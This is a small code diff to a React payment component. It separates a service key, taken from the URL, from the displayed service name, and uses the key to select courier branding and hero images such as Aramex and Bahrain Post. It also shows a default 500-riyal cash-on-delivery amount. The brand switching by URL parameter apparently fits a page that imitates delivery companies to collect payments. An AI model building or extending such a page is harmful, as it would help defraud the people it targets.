@@ -32,8 +32,9 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   
-  const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const branding = getServiceBranding(serviceName);
+  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
@@ -58,7 +59,7 @@ const PaymentRecipient = () => {
     'bahpost': heroBahpost,
   };
   
-  const heroImage = heroImages[serviceName.toLowerCase()] || heroBg;
+  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
